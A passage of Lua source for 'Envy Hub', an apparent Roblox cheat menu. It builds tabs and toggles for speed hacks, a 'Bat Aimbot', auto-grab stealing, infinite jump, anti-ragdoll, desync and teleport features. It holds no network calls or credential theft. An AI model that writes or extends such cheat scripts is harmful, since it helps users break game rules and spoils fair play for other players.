do local _sd=Instance.new("Frame",sidebar); _sd.Size=UDim2.new(0,1,1,0); _sd.Position=UDim2.new(1,-1,0,0); _sd.BackgroundColor3=BORDER; _sd.BorderSizePixel=0; _sd.ZIndex=6 end

local content = Instance.new("Frame", main)
content.Name = "ContentArea"
content.Size = UDim2.new(1, -(PW + 1 + SW + 1), 1, -44 - CORNER)
content.Position = UDim2.new(0, PW + 1 + SW + 1, 0, 44)
content.BackgroundColor3 = BG
content.BackgroundTransparency = 0
content.BorderSizePixel = 0
content.ClipsDescendants = true
content.ZIndex = 2

local mini = Instance.new("TextButton", gui)
mini.Name = "EnvyMini"
mini.Size = UDim2.new(0, 160, 0, 30)
mini.Position = UDim2.new(0, 50, 0, 50)
mini.BackgroundColor3 = Color3.fromRGB(8, 8, 8)
mini.BorderSizePixel = 0
mini.Text = "ENVY HUB"
mini.TextColor3 = WHITE
mini.Font = Enum.Font.GothamBold
mini.TextSize = 11
mini.TextXAlignment = Enum.TextXAlignment.Center
mini.ZIndex = 20
mini.Visible = false
Instance.new("UICorner", mini).CornerRadius = UDim.new(0, 8)
local miniStroke = Instance.new("UIStroke", mini)
miniStroke.Color = Color3.fromRGB(0, 0, 0)
miniStroke.Thickness = 1
makeDraggable(mini)

local function showGui() main.Visible=true; mini.Visible=false; State.guiVisible=true end
local function hideGui() main.Visible=false; mini.Visible=true; State.guiVisible=false end
minBtn.MouseButton1Click:Connect(hideGui)
mini.MouseButton1Click:Connect(showGui)
mini.MouseEnter:Connect(function() TweenService:Create(mini,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(24, 24, 24)}):Play() end)
mini.MouseLeave:Connect(function() TweenService:Create(mini,TweenInfo.new(0.1),{BackgroundColor3=Color3.fromRGB(8, 8, 8)}):Play() end)

local tabs = {}
local tabPages = {}
local activeTabName = nil
local tabDefs = {
	{name="Speed"},
	{name="Bat Aimbot"},
	{name="Mechanics"},
	{name="Movement"},
	{name="Performance"},
	{name="Settings"},
}
local switchTab
local pageLOs = {}

local tabListFrame = Instance.new("Frame", sidebar)
tabListFrame.Size = UDim2.new(1, 0, 1, 0)
tabListFrame.Position = UDim2.new(0, 0, 0, 0)
tabListFrame.BackgroundTransparency = 1
tabListFrame.BorderSizePixel = 0
tabListFrame.ZIndex = 6

local tabLL = Instance.new("UIListLayout", tabListFrame)
tabLL.SortOrder = Enum.SortOrder.LayoutOrder
tabLL.Padding = UDim.new(0, 2)
local tabPad = Instance.new("UIPadding", tabListFrame)
tabPad.PaddingTop = UDim.new(0, 10)
tabPad.PaddingLeft = UDim.new(0, 6)
tabPad.PaddingRight = UDim.new(0, 6)

local ACTIVE_TAB_BG  = Color3.fromRGB(40, 40, 40)
local ACTIVE_TAB_TXT = WHITE
local IDLE_TAB_BG    = Color3.fromRGB(16, 16, 16)
local IDLE_TAB_TXT   = WHITE

switchTab = function(name)
	activeTabName = name
	for _, td in ipairs(tabDefs) do
		local t = tabs[td.name]
		local isA = td.name == name
		TweenService:Create(t.frame, TweenInfo.new(0.14), {BackgroundColor3 = isA and ACTIVE_TAB_BG or IDLE_TAB_BG}):Play()
		TweenService:Create(t.lbl,   TweenInfo.new(0.14), {TextColor3 = isA and ACTIVE_TAB_TXT or IDLE_TAB_TXT}):Play()
		tabPages[td.name].Visible = isA
	end
end

for i, td in ipairs(tabDefs) do
	local btn = Instance.new("TextButton", tabListFrame)
	btn.Size = UDim2.new(1, 0, 0, 34)
	btn.BackgroundColor3 = IDLE_TAB_BG
	btn.BorderSizePixel = 0
	btn.Text = ""
	btn.LayoutOrder = i
	btn.ZIndex = 7
	Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 7)
	local lbl = Instance.new("TextLabel", btn)
	lbl.Size = UDim2.new(1, 0, 1, 0)
	lbl.Position = UDim2.new(0, 0, 0, 0)
	lbl.BackgroundTransparency = 1
	lbl.Text = td.name
	lbl.TextColor3 = IDLE_TAB_TXT
	lbl.Font = Enum.Font.GothamBold
	lbl.TextSize = 9
	lbl.TextXAlignment = Enum.TextXAlignment.Center
	lbl.TextWrapped = true
	lbl.ZIndex = 9
	tabs[td.name] = {frame=btn, lbl=lbl}

	local page = Instance.new("ScrollingFrame", content)
	page.Size = UDim2.new(1, 0, 1, 0)
	page.BackgroundColor3 = BG
	page.BackgroundTransparency = 0
	page.BorderSizePixel = 0
	page.ScrollBarThickness = 2
	page.ScrollBarImageColor3 = BORDER2
	page.AutomaticCanvasSize = Enum.AutomaticSize.Y
	page.CanvasSize = UDim2.new(0, 0, 0, 0)
	page.Visible = false
	page.ZIndex = 3
	local pll = Instance.new("UIListLayout", page)
	pll.SortOrder = Enum.SortOrder.LayoutOrder
	pll.Padding = UDim.new(0, 4)
	local pp = Instance.new("UIPadding", page)
	pp.PaddingLeft = UDim.new(0, 8)
	pp.PaddingRight = UDim.new(0, 8)
	pp.PaddingTop = UDim.new(0, 10)
	pp.PaddingBottom = UDim.new(0, 10)
	tabPages[td.name] = page
	pageLOs[td.name] = 0
	btn.Activated:Connect(function() switchTab(td.name) end)
	btn.MouseEnter:Connect(function()
		if activeTabName ~= td.name then TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3=Color3.fromRGB(28, 28, 28)}):Play() end
	end)
	btn.MouseLeave:Connect(function()
		if activeTabName ~= td.name then TweenService:Create(btn, TweenInfo.new(0.1), {BackgroundColor3=IDLE_TAB_BG}):Play() end
	end)
end

local function lo(tabName) pageLOs[tabName] = pageLOs[tabName] + 1; return pageLOs[tabName] end
local function pg(tabName) return tabPages[tabName] end

local function makeSecHeader(tabName, text)
	local f = Instance.new("Frame", pg(tabName))
	f.Size = UDim2.new(1, 0, 0, 18)
	f.BackgroundTransparency = 1
	f.BorderSizePixel = 0
	f.LayoutOrder = lo(tabName)
	f.ZIndex = 4
	local t = Instance.new("TextLabel", f)
	t.Size = UDim2.new(1, 0, 1, 0)
	t.BackgroundTransparency = 1
	t.Text = text:upper()
	t.TextColor3 = WHITE
	t.Font = Enum.Font.GothamBold
	t.TextSize = 8
	t.TextXAlignment = Enum.TextXAlignment.Left
	t.ZIndex = 5
	local line = Instance.new("Frame", f)
	line.Size = UDim2.new(1, 0, 0, 1)
	line.Position = UDim2.new(0, 0, 1, -1)
	line.BackgroundColor3 = BORDER
	line.BorderSizePixel = 0
	line.ZIndex = 4
end

local _unwalkSavedAnimate = nil
local function startUnwalk()
    local c = LP.Character; if not c then return end
    local hum = c:FindFirstChildOfClass("Humanoid")
    if hum then for _,t in ipairs(hum:GetPlayingAnimationTracks()) do pcall(function() t:Stop() end) end end
    local anim = c:FindFirstChild("Animate")
    if anim then _unwalkSavedAnimate = anim:Clone(); anim:Destroy() end
end
local function stopUnwalk()
    local c = LP.Character
    if c then
        local existing = c:FindFirstChild("Animate")
        if not existing then
            local src = game:GetService("StarterPlayer"):FindFirstChildOfClass("StarterCharacterScripts")
            local starterAnim = src and src:FindFirstChild("Animate")
            if starterAnim then starterAnim:Clone().Parent = c
            elseif _unwalkSavedAnimate then _unwalkSavedAnimate:Clone().Parent = c end
        end
    end
    _unwalkSavedAnimate = nil
end

local function baseCard(tabName, h2)
	local c = Instance.new("Frame", pg(tabName))
	c.Size = UDim2.new(1, 0, 0, h2 or 38)
	c.BackgroundColor3 = CARD_BG
	c.BorderSizePixel = 0
	c.LayoutOrder = lo(tabName)
	c.ZIndex = 4
	Instance.new("UICorner", c).CornerRadius = UDim.new(0, 7)
	Instance.new("UIStroke", c).Color = BORDER
	c.MouseEnter:Connect(function() TweenService:Create(c, TweenInfo.new(0.1), {BackgroundColor3=CARD_HOV}):Play() end)
	c.MouseLeave:Connect(function() TweenService:Create(c, TweenInfo.new(0.1), {BackgroundColor3=CARD_BG}):Play() end)
	return c
end

local function cLabel(p, text, x, w, sz, col, font, xa)
	local l = Instance.new("TextLabel", p)
	l.Size = UDim2.new(0, w or 140, 1, 0)
	l.Position = UDim2.new(0, x or 10, 0, 0)
	l.BackgroundTransparency = 1
	l.Text = text
	l.TextColor3 = col or WHITE
	l.Font = font or Enum.Font.GothamBold
	l.TextSize = sz or 11
	l.TextXAlignment = xa or Enum.TextXAlignment.Left
	l.ZIndex = 10
	return l
end

local function makePillToggle(parent, defOn, onToggle)
	local PW, PH = 36, 19
	local pbg = Instance.new("Frame", parent)
	pbg.Size = UDim2.new(0, PW, 0, PH)
	pbg.Position = UDim2.new(1, -(PW+10), 0.5, -PH/2)
	pbg.BackgroundColor3 = defOn and WHITE or Color3.fromRGB(16, 16, 16)
	pbg.BorderSizePixel = 0
	pbg.ZIndex = 8
	Instance.new("UICorner", pbg).CornerRadius = UDim.new(0, 10)
	local ps = Instance.new("UIStroke", pbg); ps.Color = defOn and WHITE or BORDER2; ps.Thickness = 1
	local dot = Instance.new("Frame", pbg)
	dot.Size = UDim2.new(0, 13, 0, 13)
	dot.Position = defOn and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 2, 0.5, -6)
	dot.BackgroundColor3 = defOn and BG or DIM2
	dot.BorderSizePixel = 0
	dot.ZIndex = 9
	Instance.new("UICorner", dot).CornerRadius = UDim.new(0, 4)
	local isOn = defOn or false
	local function setV(on)
		isOn = on
		TweenService:Create(pbg, TweenInfo.new(0.18), {BackgroundColor3=on and WHITE or Color3.fromRGB(16, 16, 16)}):Play()
		TweenService:Create(ps,  TweenInfo.new(0.18), {Color=on and WHITE or BORDER2}):Play()
		TweenService:Create(dot, TweenInfo.new(0.18, Enum.EasingStyle.Back), {
			Position = on and UDim2.new(1,-15,0.5,-6) or UDim2.new(0,2,0.5,-6),
			BackgroundColor3 = on and BG or DIM2
		}):Play()
	end
	local clk = Instance.new("TextButton", parent)
	clk.Size = UDim2.new(1, 0, 1, 0)
	clk.BackgroundTransparency = 1
	clk.Text = ""
	clk.ZIndex = 6
	clk.MouseButton1Click:Connect(function()
		if _anyKeyListening then return end
		isOn = not isOn; setV(isOn); if onToggle then pcall(onToggle, isOn) end
	end)
	return setV
end

local function makeKB(parent, kbEntry, onChange)
	local b = Instance.new("TextButton", parent)
	b.Size = UDim2.new(0, 44, 0, 20)
	b.BackgroundColor3 = KB_BG
	b.BorderSizePixel = 0
	local function getDisplayText()
		if kbEntry.gp then return "GP:"..kbEntry.gp.Name
		elseif kbEntry.kb then return kbEntry.kb.Name
		else return "None" end
	end
	b.Text = getDisplayText()
	b.TextColor3 = WHITE
	b.Font = Enum.Font.GothamBold
	b.TextSize = 8
	b.ZIndex = 11
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 5)
	local bs = Instance.new("UIStroke", b); bs.Color = BORDER2; bs.Thickness = 1
	local li = false; local lc; local pv = b.Text
	b.MouseButton1Click:Connect(function()
		if li then li=false; _anyKeyListening=false; if lc then lc:Disconnect(); lc=nil end; b.Text=pv; b.TextColor3=WHITE; return end
		pv=b.Text; li=true; _anyKeyListening=true; b.Text="···"; b.TextColor3=DIM
		TweenService:Create(bs, TweenInfo.new(0.1), {Color=WHITE}):Play()
		lc = UIS.InputBegan:Connect(function(inp)
			if not li then return end
			local isKb = inp.UserInputType == Enum.UserInputType.Keyboard
			local isGp = inp.UserInputType == Enum.UserInputType.Gamepad1
			if not isKb and not isGp then return end
			if inp.KeyCode == Enum.KeyCode.Escape then
				li=false; _anyKeyListening=false; if lc then lc:Disconnect(); lc=nil end
				b.Text=pv; b.TextColor3=WHITE; TweenService:Create(bs,TweenInfo.new(0.1),{Color=BORDER2}):Play(); return
			end
			if isGp then
				kbEntry.gp = inp.KeyCode; kbEntry.kb = nil
				b.Text = "GP:"..inp.KeyCode.Name; pv = b.Text
			else
				kbEntry.kb = inp.KeyCode; kbEntry.gp = nil
				b.Text = inp.KeyCode.Name; pv = b.Text
			end
			b.TextColor3=WHITE
			li=false; _anyKeyListening=false; if lc then lc:Disconnect(); lc=nil end
			TweenService:Create(bs, TweenInfo.new(0.1), {Color=BORDER2}):Play()
			if onChange then onChange(inp.KeyCode) end
		end)
	end)
	return b
end

local function rowToggle(tabName, label, sub, defOn, onToggle)
	local c = baseCard(tabName, sub and 48 or 38)
	cLabel(c, label, 10, 160, 11, WHITE, Enum.Font.GothamBold)
	if sub then
		local sl = cLabel(c, sub, 10, 170, 9, DIM, Enum.Font.Gotham)
		sl.Size = UDim2.new(0, 170, 0, 13); sl.Position = UDim2.new(0, 10, 0, 24)
	end
	return makePillToggle(c, defOn, onToggle)
end

local function rowToggleKB(tabName, label, sub, kbEntry, defOn, onToggle, onKeyChange)
	local c = baseCard(tabName, sub and 48 or 38)
	cLabel(c, label, 10, 120, 11, WHITE, Enum.Font.GothamBold)
	if sub then
		local sl = cLabel(c, sub, 10, 150, 9, DIM, Enum.Font.Gotham)
		sl.Size = UDim2.new(0, 150, 0, 13); sl.Position = UDim2.new(0, 10, 0, 24)
	end
	local kb = makeKB(c, kbEntry, function(k) if onKeyChange then onKeyChange(k) end end)
	kb.Position = UDim2.new(1, -(44+10+36+8), 0.5, -10)
	kb.ZIndex = 11
	local PW, PH = 36, 19
	local pbg = Instance.new("Frame", c)
	pbg.Size = UDim2.new(0, PW, 0, PH)
	pbg.Position = UDim2.new(1, -(PW+10), 0.5, -PH/2)
	pbg.BackgroundColor3 = defOn and WHITE or Color3.fromRGB(16, 16, 16)
	pbg.BorderSizePixel = 0
	pbg.ZIndex = 8
	Instance.new("UICorner", pbg).CornerRadius = UDim.new(0, 10)
	local ps = Instance.new("UIStroke", pbg); ps.Color = defOn and WHITE or BORDER2; ps.Thickness = 1
	local dot = Instance.new("Frame", pbg)
	dot.Size = UDim2.new(0, 13, 0, 13)
	dot.Position = defOn and UDim2.new(1, -15, 0.5, -6) or UDim2.new(0, 2, 0.5, -6)
	dot.BackgroundColor3 = defOn and BG or DIM2
	dot.BorderSizePixel = 0
	dot.ZIndex = 9
	Instance.new("UICorner", dot).CornerRadius = UDim.new(0, 4)
	local isOn = defOn or false
	local function setV(on)
		isOn = on
		TweenService:Create(pbg, TweenInfo.new(0.18), {BackgroundColor3=on and WHITE or Color3.fromRGB(16, 16, 16)}):Play()
		TweenService:Create(ps,  TweenInfo.new(0.18), {Color=on and WHITE or BORDER2}):Play()
		TweenService:Create(dot, TweenInfo.new(0.18, Enum.EasingStyle.Back), {
			Position = on and UDim2.new(1,-15,0.5,-6) or UDim2.new(0,2,0.5,-6),
			BackgroundColor3 = on and BG or DIM2
		}):Play()
	end
	local clk = Instance.new("TextButton", c)
	clk.Size = UDim2.new(1, 0, 1, 0)
	clk.BackgroundTransparency = 1
	clk.Text = ""
	clk.ZIndex = 6
	clk.MouseButton1Click:Connect(function()
		if _anyKeyListening then return end
		isOn = not isOn; setV(isOn); if onToggle then pcall(onToggle, isOn) end
	end)
	return setV, kb
end

local function rowKBOnly(tabName, label, sub, kbEntry, onKeyChange)
	local c = baseCard(tabName, sub and 48 or 38)
	cLabel(c, label, 10, 160, 11, WHITE, Enum.Font.GothamBold)
	if sub then
		local sl = cLabel(c, sub, 10, 170, 9, DIM, Enum.Font.Gotham)
		sl.Size = UDim2.new(0, 170, 0, 13); sl.Position = UDim2.new(0, 10, 0, 24)
	end
	local kb = makeKB(c, kbEntry, function(k) if onKeyChange then onKeyChange(k) end end)
	kb.Position = UDim2.new(1, -(44+10), 0.5, -10)
	kb.ZIndex = 11
	return kb
end

local function rowInput(tabName, label, sub, default, onChange)
	local c = baseCard(tabName, sub and 48 or 38)
	cLabel(c, label, 10, 130, 11, WHITE, Enum.Font.GothamBold)
	if sub then
		local sl = cLabel(c, sub, 10, 160, 9, DIM, Enum.Font.Gotham)
		sl.Size = UDim2.new(0, 160, 0, 13); sl.Position = UDim2.new(0, 10, 0, 24)
	end
	local box = Instance.new("TextBox", c)
	box.Size = UDim2.new(0, 64, 0, 24)
	box.Position = UDim2.new(1, -74, 0.5, -12)
	box.BackgroundColor3 = INPUT_BG
	box.BorderSizePixel = 0
	box.Text = tostring(default)
	box.TextColor3 = WHITE
	box.Font = Enum.Font.GothamBold
	box.TextSize = 11
	box.ClearTextOnFocus = false
	box.ZIndex = 11
	Instance.new("UICorner", box).CornerRadius = UDim.new(0, 5)
	local bs = Instance.new("UIStroke", box); bs.Color = BORDER2; bs.Thickness = 1; bs.ZIndex = 12
	box.Focused:Connect(function() TweenService:Create(bs, TweenInfo.new(0.1), {Color=WHITE}):Play() end)
	box.FocusLost:Connect(function()
		TweenService:Create(bs, TweenInfo.new(0.1), {Color=BORDER2}):Play()
		if onChange then local n = tonumber(box.Text); if n then onChange(n) else box.Text = tostring(default) end end
	end)
	return box
end

local function rowActionBtn(tabName, label, onClick)
	local b = Instance.new("TextButton", pg(tabName))
	b.Size = UDim2.new(1, 0, 0, 36)
	b.BackgroundColor3 = WHITE
	b.BorderSizePixel = 0
	b.Text = label
	b.TextColor3 = BG
	b.Font = Enum.Font.GothamBold
	b.TextSize = 11
	b.LayoutOrder = lo(tabName)
	b.ZIndex = 5
	Instance.new("UICorner", b).CornerRadius = UDim.new(0, 7)
	b.MouseButton1Click:Connect(function()
		TweenService:Create(b, TweenInfo.new(0.08), {BackgroundColor3=Color3.fromRGB(200,200,200)}):Play()
		task.delay(0.15, function() TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=WHITE}):Play() end)
		if onClick then pcall(onClick) end
	end)
	b.MouseEnter:Connect(function() TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=Color3.fromRGB(210,210,210)}):Play() end)
	b.MouseLeave:Connect(function() TweenService:Create(b, TweenInfo.new(0.1), {BackgroundColor3=WHITE}):Play() end)
	return b
end

local pbFrame = Instance.new("Frame", gui)
pbFrame.Size = UDim2.new(0, 240, 0, 38)
pbFrame.Position = UDim2.new(0.5, -120, 1, -58)
pbFrame.BackgroundColor3 = Color3.fromRGB(9, 9, 13)
pbFrame.BorderSizePixel = 0
pbFrame.Active = true
Instance.new("UICorner", pbFrame).CornerRadius = UDim.new(0, 10)
Instance.new("UIStroke", pbFrame).Color = Color3.fromRGB(0, 0, 0)
makeDraggable(pbFrame)

progressPct = Instance.new("TextLabel", pbFrame)
progressPct.Size = UDim2.new(1, -20, 0, 16)
progressPct.Position = UDim2.new(0, 10, 0, 6)
progressPct.BackgroundTransparency = 1
progressPct.Text = "0%"
progressPct.TextColor3 = WHITE
progressPct.Font = Enum.Font.GothamBold
progressPct.TextSize = 11
progressPct.TextXAlignment = Enum.TextXAlignment.Left
progressPct.ZIndex = 5

progressRadLbl = Instance.new("TextLabel", pbFrame)
progressRadLbl.Size = UDim2.new(0, 110, 0, 16)
progressRadLbl.Position = UDim2.new(1, -120, 0, 6)
progressRadLbl.BackgroundTransparency = 1
progressRadLbl.Text = "Radius: "..Steal.StealRadius
progressRadLbl.TextColor3 = WHITE
progressRadLbl.Font = Enum.Font.GothamBold
progressRadLbl.TextSize = 11
progressRadLbl.TextXAlignment = Enum.TextXAlignment.Right
progressRadLbl.ZIndex = 5

local pbBg = Instance.new("Frame", pbFrame)
pbBg.Size = UDim2.new(1, -20, 0, 8)
pbBg.Position = UDim2.new(0, 10, 0, 22)
pbBg.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
pbBg.BorderSizePixel = 0
Instance.new("UICorner", pbBg).CornerRadius = UDim.new(0, 5)
progressFill = Instance.new("Frame", pbBg)
progressFill.Size = UDim2.new(0, 0, 1, 0)
progressFill.BackgroundColor3 = WHITE
progressFill.BorderSizePixel = 0
Instance.new("UICorner", progressFill).CornerRadius = UDim.new(0, 5)

local function resetProgressBar()
	progressPct.Text = "0%"
	progressFill.Size = UDim2.new(0,0,1,0)
	if progressRadLbl then progressRadLbl.Visible = true end
end

do -- tab content scope
makeSecHeader("Speed", "Speed Configuration")
normalBox = rowInput("Speed", "Normal Speed", nil, NS, function(v) if v>0 and v<=500 then NS=v end end)
carryBox  = rowInput("Speed", "Carry Speed",  nil, CS, function(v) if v>0 and v<=500 then CS=v end end)
laggerBox = rowInput("Speed", "Lagger Speed", nil, LS, function(v) if v>0 and v<=500 then LS=v end end)
laggerBox2 = rowInput("Speed", "Lagger Carry Speed", nil, LS2, function(v) if v>0 and v<=500 then LS2=v end end)

do
	local c = baseCard("Speed", 38)
	cLabel(c, "Mode", 10, 80, 11, WHITE, Enum.Font.GothamBold)
	modeValLbl = cLabel(c, "Normal", 88, 80, 10, DIM, Enum.Font.GothamBold, Enum.TextXAlignment.Center)
	local kb = makeKB(c, KB.Speed, function(k) end)
	kb.Position = UDim2.new(1, -(44+10), 0.5, -10)
	kb.ZIndex = 11
	local clk = Instance.new("TextButton", c)
	clk.Size = UDim2.new(0.65, 0, 1, 0)
	clk.BackgroundTransparency = 1
	clk.Text = ""
	clk.ZIndex = 6
	clk.Active = true
	clk.Activated:Connect(function()
		if _anyKeyListening then return end
		State.speedToggled = not State.speedToggled
		if State.speedToggled then State.laggerToggled = false; if mobileLaggerSetActive then mobileLaggerSetActive(false) end end
		modeValLbl.Text = State.laggerToggled and "Lagger" or (State.speedToggled and "Carry" or "Normal")
	end)
end

do
	local c = baseCard("Speed", 38)
	cLabel(c, "Lagger Mode", 10, 120, 11, WHITE, Enum.Font.GothamBold)
	local kb = makeKB(c, KB.Lagger, function(k) KB.Lagger.kb = k end)
	kb.Position = UDim2.new(1, -(44+10), 0.5, -10)
	kb.ZIndex = 11
	local clk = Instance.new("TextButton", c)
	clk.Size = UDim2.new(0.65, 0, 1, 0)
	clk.BackgroundTransparency = 1
	clk.Text = ""
	clk.ZIndex = 6
	clk.Active = true
	clk.Activated:Connect(function()
		if _anyKeyListening then return end
		State.laggerToggled = not State.laggerToggled
		if State.laggerToggled then State.speedToggled = false; if mobileSpeedSetActive then mobileSpeedSetActive(false) end end
		modeValLbl.Text = State.laggerToggled and "Lagger" or (State.speedToggled and "Carry" or "Normal")
		if mobileLaggerSetActive then mobileLaggerSetActive(State.laggerToggled) end
	end)
end

makeSecHeader("Bat Aimbot", "Bat Combat")
do
	local sv
	sv, _ = rowToggleKB("Bat Aimbot", "Auto Bat", nil, KB.AutoBat, false,
	function(on)
		State.autoBatToggled = on
		if on then startBatAimbot() else stopBatAimbot() end
	end,
	function(k) KB.AutoBat.kb = k end)
	autoBatSetVisual = sv -- will be extended after panel is built
	setAutoBat = sv       -- keep reference to UI row setter
end

makeSecHeader("Mechanics", "Game Mechanics")
setAutoGrab = rowToggle("Mechanics", "Auto Grab", nil, false, function(on)
	Steal.AutoStealEnabled = on
	if on then if not pcall(startAutoSteal) then Steal.AutoStealEnabled = false; setAutoGrab(false) end
	else stopAutoSteal() end
end)

do
	local c = baseCard("Mechanics", 38)
	cLabel(c, "Grab Radius", 10, 120, 11, WHITE, Enum.Font.GothamBold)
	radValBtn = Instance.new("TextButton", c)
	radValBtn.Size = UDim2.new(0, 64, 0, 24)
	radValBtn.Position = UDim2.new(1, -74, 0.5, -12)
	radValBtn.BackgroundColor3 = INPUT_BG
	radValBtn.BorderSizePixel = 0
	radValBtn.Text = tostring(Steal.StealRadius)
	radValBtn.TextColor3 = WHITE
	radValBtn.Font = Enum.Font.GothamBold
	radValBtn.TextSize = 11
	radValBtn.ZIndex = 11
	Instance.new("UICorner", radValBtn).CornerRadius = UDim.new(0, 5)
	Instance.new("UIStroke", radValBtn).Color = BORDER2
	local typing2 = false
	radValBtn.Activated:Connect(function()
		if typing2 then return end; typing2 = true
		local tb = Instance.new("TextBox", c)
		tb.Size = radValBtn.Size; tb.Position = radValBtn.Position
		tb.BackgroundColor3 = CARD_HOV; tb.BorderSizePixel = 0
		tb.Text = tostring(Steal.StealRadius)
		tb.TextColor3 = WHITE; tb.Font = Enum.Font.GothamBold; tb.TextSize = 11
		tb.ClearTextOnFocus = false; tb.ZIndex = 12
		Instance.new("UICorner", tb).CornerRadius = UDim.new(0, 5)
		Instance.new("UIStroke", tb).Color = WHITE
		tb:CaptureFocus()
		tb.FocusLost:Connect(function()
			local num = tonumber(tb.Text)
			if num and num>=5 and num<=300 then
				Steal.StealRadius = math.floor(num)
				radValBtn.Text = tostring(Steal.StealRadius)
				progressRadLbl.Text = "Radius: "..Steal.StealRadius
				Steal.cachedPrompts = {}; Steal.promptCacheTime = 0
			end
			tb:Destroy(); typing2 = false
		end)
	end)
end

setInfJump       = rowToggle("Mechanics", "Infinite Jump",  nil, false, function(on) State.infJumpEnabled = on end)
setAntiRag       = rowToggle("Mechanics", "Anti Ragdoll",   nil, false, function(on) State.antiRagdollEnabled=on; if on then startAntiRagdoll() else stopAntiRagdoll() end end)
setUnwalkToggle  = rowToggle("Mechanics", "Unwalk",         nil, false, function(on) State.unwalkEnabled=on; if on then startUnwalk() else stopUnwalk() end end)
setMedusaCounter = rowToggle("Mechanics", "Medusa Counter", nil, false, function(on) State.medusaCounterEnabled=on; if on then setupMedusaCounter(LP.Character) else stopMedusaCounter() end end)
setBatCounter    = rowToggle("Mechanics", "Bat Counter",    nil, false, function(on) State.batCounterEnabled=on; if on then startBatCounter() else stopBatCounter() end end)
setDesync        = rowToggle("Mechanics", "Desync",         nil, false, function(on) if on then startDesyncSession() else stopDesyncSession() end end)

makeSecHeader("Movement", "Movement & Teleport")
do
	local sv
	sv, _ = rowToggleKB("Movement", "Auto Left", nil, KB.AutoLeft, false,
	function(on)
		State.autoLeftEnabled = on
		if on then
			if State.autoRightEnabled then State.autoRightEnabled=false; if autoRightSetVisual then autoRightSetVisual(false) end; stopAutoRight() end
			if State.autoBatToggled then State.autoBatToggled=false; if autoBatSetVisual then autoBatSetVisual(false) end; stopBatAimbot() end
			startAutoLeft()
		else stopAutoLeft() end
		if autoLeftSetVisual then autoLeftSetVisual(State.autoLeftEnabled) end
	end, function(k) KB.AutoLeft.kb=k end)
	autoLeftSetVisual = sv
end
do
	local sv
	sv, _ = rowToggleKB("Movement", "Auto Right", nil, KB.AutoRight, false,
	function(on)
		State.autoRightEnabled = on
		if on then
			if State.autoLeftEnabled then State.autoLeftEnabled=false; if autoLeftSetVisual then autoLeftSetVisual(false) end; stopAutoLeft() end
			if State.autoBatToggled then State.autoBatToggled=false; if autoBatSetVisual then autoBatSetVisual(false) end; stopBatAimbot() end
			startAutoRight()
		else stopAutoRight() end
		if autoRightSetVisual then autoRightSetVisual(State.autoRightEnabled) end
	end, function(k) KB.AutoRight.kb=k end)
	autoRightSetVisual = sv
end
rowKBOnly("Movement", "Drop",    nil, KB.Drop,   function(k) KB.Drop.kb=k end)
rowKBOnly("Movement", "TP Down", nil,       KB.TPDown, function(k) KB.TPDown.kb=k end)

do
	setAutoTPDownVisual = rowToggle("Movement", "Auto TP Down", nil, false, function(on)
		autoTPDownEnabled = on
		if on then startAutoTPDown() else stopAutoTPDown() end
	end)
	rowInput("Movement", "TP Down Height", nil, autoTPDownHeight, function(v)
		autoTPDownHeight = math.clamp(v, 0, 500)
	end)
end

-- ── Stretch Rez ──────────────────────────────────────────────────────────
local stretchRezConn = nil
local function enableStretchRez()
	State.stretchRezEnabled = true
	workspace.CurrentCamera.FieldOfView = 120
	if stretchRezConn then stretchRezConn:Disconnect() end
	stretchRezConn = RunService.RenderStepped:Connect(function()
		if not State.stretchRezEnabled then stretchRezConn:Disconnect(); stretchRezConn = nil; return end
		workspace.CurrentCamera.FieldOfView = 120
	end)
end
local function disableStretchRez()
	State.stretchRezEnabled = false
	if stretchRezConn then stretchRezConn:Disconnect(); stretchRezConn = nil end
	workspace.CurrentCamera.FieldOfView = 70
end

-- ── Remove Accessories ───────────────────────────────────────────────────
local accessoryConn = nil
local function enableRemoveAccessories()
	State.removeAccessoriesEnabled = true
	for _, p in pairs(Players:GetPlayers()) do
		if p.Character then
			for _, obj in ipairs(p.Character:GetDescendants()) do
				if obj:IsA("Accessory") or obj:IsA("Hat") then pcall(function() obj:Destroy() end) end
			end
		end
	end
	if not accessoryConn then
		accessoryConn = Players.PlayerAdded:Connect(function(player)
			player.CharacterAdded:Connect(function(char)
				task.wait(0.5)
				if not State.removeAccessoriesEnabled then return end
				for _, obj in ipairs(char:GetDescendants()) do
					if obj:IsA("Accessory") or obj:IsA("Hat") then pcall(function() obj:Destroy() end) end
				end
			end)
		end)
	end
end
local function disableRemoveAccessories()
	State.removeAccessoriesEnabled = false
	if accessoryConn then accessoryConn:Disconnect(); accessoryConn = nil end
end

-- ── Dark Mode ───────────────────────────────────────────────────────────
local _darkEnabled = false
local _defBrightness = game:GetService("Lighting").Brightness
local _defClock = game:GetService("Lighting").ClockTime
local _defAmbient = game:GetService("Lighting").OutdoorAmbient
local function enableDarkMode()
	_darkEnabled = true; State.darkModeEnabled = true
	local Lighting = game:GetService("Lighting")
	local sky = Lighting:FindFirstChild("GalaxySky") or Instance.new("Sky")
	sky.Name = "GalaxySky"
	sky.SkyboxBk = "rbxassetid://159454299"
	sky.SkyboxDn = "rbxassetid://159454296"
	sky.SkyboxFt = "rbxassetid://159454293"
	sky.SkyboxLf = "rbxassetid://159454286"
	sky.SkyboxRt = "rbxassetid://159454289"
	sky.SkyboxUp = "rbxassetid://159454291"
	sky.Parent = Lighting
	Lighting.Brightness = 0
	Lighting.ClockTime = 0
	Lighting.ExposureCompensation = -2
	Lighting.OutdoorAmbient = Color3.fromRGB(0, 0, 0)
end
local function disableDarkMode()
	_darkEnabled = false; State.darkModeEnabled = false
	local Lighting = game:GetService("Lighting")
	local sky = Lighting:FindFirstChild("GalaxySky")
	if sky then sky:Destroy() end
	Lighting.Brightness = _defBrightness
	Lighting.ClockTime = _defClock
	Lighting.ExposureCompensation = 0
	Lighting.OutdoorAmbient = _defAmbient
end

-- ── Performance Tab UI ───────────────────────────────────────────────────
makeSecHeader("Performance", "Performance")

-- ── Anti Lag ─────────────────────────────────────────────────────────────
do
	local _Lighting = game:GetService("Lighting")
	local _antiLagConn = nil

	local function applyAntiLag(instance)
		if instance:IsA("ParticleEmitter") then
